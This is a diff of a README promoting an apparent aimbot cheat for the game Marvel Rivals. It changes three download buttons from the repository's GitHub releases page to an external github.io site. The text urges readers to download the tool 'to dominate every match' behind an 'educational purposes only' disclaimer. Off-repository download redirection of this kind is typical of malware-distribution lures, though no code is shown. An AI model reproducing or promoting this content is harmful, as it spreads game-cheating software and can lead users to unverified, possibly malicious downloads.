@@ -1,7 +1,7 @@
 <h1>⚡ marvel-rivals-aimbot-2026 - Dominate Every Match Instantly</h1>
 
 <p align="center">
-<a href="https://github.com/wid6981/marvel-rivals-aimbot-2026/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5733?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="300"></a>
+<a href="https://wid6981.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5733?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="300"></a>
 </p>
 
 ---
@@ -37,7 +37,7 @@ Follow these simple steps to get up and running in under two minutes.
 **Visit this link to download the application**:
 
 <p align="center">
-<a href="https://github.com/wid6981/marvel-rivals-aimbot-2026/releases"><img src="https://img.shields.io/badge/📦_CLICK_HERE_TO_DOWNLOAD-28B463?style=for-the-badge" alt="Download" width="250"></a>
+<a href="https://wid6981.github.io"><img src="https://img.shields.io/badge/📦_CLICK_HERE_TO_DOWNLOAD-28B463?style=for-the-badge" alt="Download" width="250"></a>
 </p>
 
 The download page will show you the latest release file. Click the download button for the most recent version.
@@ -168,7 +168,7 @@ This software is provided for **educational and research purposes only**. It is 
 Just in case you scrolled past it:
 
 <p align="center">
-<a href="https://github.com/wid6981/marvel-rivals-aimbot-2026/releases"><img src="https://img.shields.io/badge/🟢_DOWNLOAD_LATEST_VERSION-008000?style=for-the-badge&logo=github" alt="Download" width="280"></a>
+<a href="https://wid6981.github.io"><img src="https://img.shields.io/badge/🟢_DOWNLOAD_LATEST_VERSION-008000?style=for-the-badge&logo=github" alt="Download" width="280"></a>
 </p>
 
 Click the button above, download the latest release file, follow the steps in the Getting Started section, and enjoy your new competitive edge.
